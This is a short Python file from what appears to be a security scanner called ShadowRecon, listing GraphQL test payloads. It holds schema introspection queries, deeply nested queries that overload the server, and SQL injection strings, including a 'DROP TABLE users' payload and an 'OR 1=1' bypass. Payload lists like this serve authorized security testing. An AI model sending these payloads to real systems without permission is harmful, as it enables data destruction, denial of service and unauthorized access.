"""
GraphQL Security Payloads for ShadowRecon v1.0
"""

class GraphQLPayloads:
    """GraphQL security test payloads"""

    INTROSPECTION_QUERIES = [
        '{"query": "{ __schema { types { name } } }"}',
        '{"query": "{ __type(name: \"Query\") { fields { name args { name type { name } } } } }"}',
        '{"query": "fragment on __Schema { queryType { fields { name } } }"}',
    ]

    DEPTH_ATTACKS = [
        '{"query": "{ user { posts { comments { user { posts { comments { id } } } } } } }"}',
        '{"query": "query nested($depth: Int = 10) { user(id: 1) { id name posts(first: $depth) { id title user { posts(first: $depth) { id } } } } }"}',
    ]

    INJECTION_TESTS = [
        '{"query": "{ user(id: \"1\"; DROP TABLE users; --\") { id } }"}',
        '{"query": "{ user(id: \"1\" OR \"1\"=\"1\") { id name } }"}',
    ]

    @classmethod
    def get_all_graphql_payloads(cls):
        return cls.INTROSPECTION_QUERIES + cls.DEPTH_ATTACKS + cls.INJECTION_TESTS
